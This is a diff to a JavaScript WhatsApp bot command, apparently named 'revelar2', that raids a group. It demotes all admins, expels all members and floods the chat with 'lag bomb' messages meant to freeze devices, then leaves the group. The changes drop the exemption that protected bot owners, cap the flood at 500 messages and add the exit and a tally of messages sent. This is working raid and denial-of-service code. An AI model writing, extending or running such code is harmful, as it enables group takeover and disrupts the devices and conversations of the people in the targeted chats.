@@ -38,13 +38,9 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
   const cleanJid = jid => jid.split('/')[0]
   const botNumber = cleanJid(conn.user.jid)
 
-  const owners = global.owner.map(o => typeof o === 'string' ? o : o[0])
   const admins = participantes.filter(p => p.admin).map(p => cleanJid(p.id))
-  const adminsADegradar = admins.filter(id => id !== botNumber && !owners.includes(id))
+  const adminsADegradar = admins.filter(id => id !== botNumber)
   const operativos = participantes.map(u => cleanJid(u.id)).filter(id => !admins.includes(id) && id !== botNumber)
-
-  global.db.data.bloqueoTemporal ??= {}
-  global.db.data.bloqueoTemporal[m.chat] = true
 
   await m.reply(`
 ╭━━━┳━━━┳━━━┳━━━┳━━━╮
@@ -60,12 +56,14 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
 ⏳ Ejecutando maniobras estratégicas...
 `.trim())
 
+  let bombasEnviadas = 0
   let bombasActivas = true
 
   const lanzarBombas = async () => {
-    while (bombasActivas) {
+    while (bombasActivas && bombasEnviadas < 500) {
       try {
         await conn.relayMessage(m.chat, buildLagMessage(), { messageId: conn.generateMessageTag() })
+        bombasEnviadas++
         await delay(300)
       } catch (e) {}
     }
@@ -88,7 +86,6 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
   }
 
   bombasActivas = false
-  delete global.db.data.bloqueoTemporal[m.chat]
 
   const fin = Date.now()
   const tiempo = ((fin - inicio) / 1000).toFixed(2)
@@ -98,9 +95,13 @@ let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
 
 🔻 Administradores degradados: ${adminsADegradar.length}
 ⚔️ Miembros expulsados: ${operativos.length}
-💣 Bombas enviadas durante toda la operación
-⏱️ Tiempo total: ${tiempo} segundos`
+💣 Bombas enviadas: ${bombasEnviadas}
+⏱️ Tiempo total: ${tiempo} segundos
+
+🚪 *Shizuka se retira del plano...*`
   )
+
+  await conn.groupLeave(m.chat)
 }
 
 handler.help = ['revelar2']
